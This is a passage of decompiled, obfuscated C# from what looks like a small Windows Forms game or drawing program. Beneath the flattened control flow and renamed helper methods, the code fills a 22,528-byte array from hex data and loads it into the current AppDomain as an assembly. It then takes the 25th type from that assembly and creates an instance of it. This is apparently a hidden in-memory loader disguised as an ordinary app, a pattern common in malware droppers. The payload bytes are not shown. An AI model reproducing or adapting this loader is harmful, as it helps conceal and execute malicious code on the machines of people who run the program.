					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)((num2 * 1973918969) ^ 0x4200ED06);
					continue;
				case 31u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 1337087701) ^ -865318998;
					continue;
				case 30u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -258628213) ^ 0x7CB9F8B5;
					continue;
				case 29u:
					array = new byte[22528];
					num = (int)((num2 * 307613398) ^ 0x486F08FA);
					continue;
				case 28u:
					num = (int)((num2 * 1352660240) ^ 0x7A8DB8AD);
					continue;
				case 27u:
					num = ((int)num2 * -1217906456) ^ 0x47A0CD86;
					continue;
				case 26u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 1443114947) ^ -1087840881;
					continue;
				case 25u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -1992493746) ^ 0x2946AA7E;
					continue;
				case 24u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)(num2 * 1903475569) ^ -569967298;
					continue;
				case 23u:
					num = ((int)num2 * -276754258) ^ 0x102825AD;
					continue;
				case 22u:
					flag = num3 < 22528;
					num = 252278457;
					continue;
				case 21u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)((num2 * 262848441) ^ 0x61984D5B);
					continue;
				case 20u:
					num = (int)(num2 * 955640327) ^ -1236749142;
					continue;
				case 19u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 459649063) ^ 0x2BF90B28);
					continue;
				case 18u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1109408363) ^ 0x732C9F80;
					continue;
				case 17u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -523570890) ^ -923379369;
					continue;
				case 16u:
					num = (int)(num2 * 2136975674) ^ -293675329;
					continue;
				case 15u:
					num = (int)(num2 * 1315621383) ^ -2047225602;
					continue;
				case 14u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)((num2 * 1113425931) ^ 0x16E6A01F);
					continue;
				case 13u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)(num2 * 1985550249) ^ -147640261;
					continue;
				case 12u:
					num3 = 0;
					num = ((int)num2 * -1154748152) ^ -119636184;
					continue;
				case 11u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -1336811628) ^ 0x11C2E48F;
					continue;
				case 10u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)(num2 * 356449436) ^ -955203216;
					continue;
				case 9u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -620297637) ^ 0x5CA87500;
					continue;
				case 8u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 1277073914) ^ -580761265;
					continue;
				case 7u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 718768039) ^ -542464475;
					continue;
				case 6u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -1676285034) ^ -258655064;
					continue;
				case 5u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)(num2 * 434085141) ^ -547249208;
					continue;
				case 4u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -112531255) ^ 0x5EA6AA28;
					continue;
				case 3u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 1659978996) ^ 0x5898D32F);
					continue;
				case 2u:
					num = ((int)num2 * -67226943) ^ 0x2679F30E;
					continue;
				case 1u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 1819938634) ^ -381839501;
					continue;
				case 0u:
					num = ((int)num2 * -335638313) ^ 0x4BD04B1;
					continue;
				default:
					return;
				case 66u:
					break;
				case 99u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = 1783021037;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7030DF16u) % 5u)
				{
				case 3u:
					q = ContextAdd(Level);
					num = ((int)num2 * -888730361) ^ 0x77968EC9;
					continue;
				case 1u:
					num = (int)(num2 * 1788026380) ^ -1460132636;
					continue;
				case 0u:
					PerformTable(q);
					num = (int)((num2 * 1708408197) ^ 0x6EFB8FD6);
					continue;
				default:
					return;
				case 2u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = Form1.smethod_94(Form1.smethod_93(), Position);
		while (true)
		{
			int num = 1384920340;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7658D892u) % 3u)
				{
				case 1u:
					goto IL_000e;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_000e:
				num = ((int)num2 * -1368249822) ^ -474621233;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
